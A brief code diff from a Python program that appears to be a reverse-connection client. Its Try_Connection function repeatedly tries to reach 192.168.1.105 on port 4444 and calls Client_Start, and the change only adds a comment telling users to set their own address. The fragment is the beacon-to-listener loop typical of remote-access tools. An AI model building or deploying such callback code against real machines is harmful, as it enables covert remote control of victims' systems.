@@ -211,7 +211,7 @@ def Try_Connection():
     while True:
         time.sleep(5)
         try:
-            mysocket = mySocket("192.168.1.105",4444)
+            mysocket = mySocket("192.168.1.105",4444) # Change this values according to yourself.
             mysocket.Client_Start()
         except Exception:
             Try_Connection()
